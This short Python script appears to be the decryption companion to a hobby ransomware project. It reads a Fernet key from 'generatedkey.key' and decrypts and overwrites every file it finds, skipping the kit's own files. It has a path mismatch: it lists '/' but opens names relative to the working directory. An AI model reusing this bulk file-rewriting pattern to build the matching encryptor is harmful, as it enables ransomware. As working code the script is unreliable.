import os
from cryptography.fernet import Fernet

files = []
extract = ["ransomware.py","ransomdecrypted.py","generatedkey.key"]
for file in os.listdir(path="/"):
    if file in extract:
        continue
    trfile = os.path.isfile(file)
    if trfile == True:
        files.append(file)

with open("generatedkey.key","rb") as generatedkey:
	decryted_key = generatedkey.read()

for file in files:
    with open (file,"rb") as the_file:
        data=the_file.read()
        data_decrypted = Fernet(decryted_key).decrypt(data)
    with open (file,"wb") as the_file:
         the_file.write(data_decrypted)
        